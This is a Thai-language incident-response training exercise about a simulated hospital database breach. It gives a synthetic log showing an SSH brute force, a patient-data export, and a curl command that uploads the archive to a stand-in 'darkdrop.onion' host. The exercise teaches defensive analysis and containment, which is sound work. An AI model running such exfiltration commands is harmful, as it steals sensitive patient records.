# DAY 1 — "ระบบโรงพยาบาลถูกเจาะตอนตี 2"

**Goal ของเรา** : วิเคราะห์ attack log และตัดสินใจ containment action ภายใน session เดียว

## Situation ที่ได้รับ

Link: https://mission1.vtrx.dev/
#### Logs(ในเว็ปอาจจะดูง่ายกว่า) : 

```
Apr 24 02:09:27 hospital-db sshd[18429]: Failed password for root from 185.220.101.47 port 51131 ssh2 
Apr 24 02:09:32 hospital-db sshd[18431]: Failed password for root from 185.220.101.47 port 51144 ssh2 
Apr 24 02:09:39 hospital-db sshd[18435]: Failed password for root from 185.220.101.47 port 51159 ssh2 
Apr 24 02:09:47 hospital-db sshd[18439]: Accepted password for root from 185.220.101.47 port 51172 ssh2 
Apr 24 02:09:47 hospital-db sshd[18439]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0) 
Apr 24 02:09:47 hospital-db systemd-logind[721]: New session 88 of user root. 
Apr 24 02:10:44 hospital-db sudo: root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 /opt/scripts/db_export.py --target patients_2024 --output /tmp/patients_2024.sql 
Apr 24 02:13:28 hospital-db sudo: root : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/patients_2024.tar.gz patients_2024.sql 
Apr 24 02:15:51 hospital-db sudo: root : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -X POST --data-binary @patients_2024.tar.gz http://darkdrop.onion/upload 
Apr 24 02:16:55 hospital-db kernel: [392811.422719] OUTBOUND eth0 SRC=10.0.2.15 DST=45.142.122.91 LEN=1500 PROTO=TCP SPT=42110 DPT=80 
Apr 24 02:16:56 hospital-db sshd[18439]: Received disconnect from 185.220.101.47 port 51172:11: discon
```

# **Activities:**

1. อ่าน log แล้วเขียนประมาณเอาว่าเกิดไรขึ้น
2. ระบุ attack type — Brute force? Phishing? Insider? อธิบายว่าดูจากอะไร
3. ประเมินความเสียหาย — ข้อมูลถูกขโมยไปแล้วหรือยัง? ตอบแบบ "มีหลักฐาน / ไม่มีหลักฐาน"
4. เลือก 3 immediate actions จาก: `block IP` / `kill session` / `reset password` / `shutdown server` / `notify patients` / `preserve logs` — แล้วเรียงลำดับว่าทำอะไรก่อน
5. เขียน Incident Summary 5 บรรทัด: **What / When / How / Impact / Next Step**
### **Constraint / Twist:** 
ระหว่างที่วิเคราะห์ IT Manager แจ้งว่า "ถ้า shutdown server จะมีผู้ป่วย ICU 4 คนที่ monitor ผ่านระบบนี้" คุณจะ shutdown หรือไม่? ต้องตอบพร้อมเหตุผล

### Output : 
Incident Summary + 3 actions เรียงลำดับ + คำตอบ trade-off เรื่อง ICU (1 ย่อหน้า)
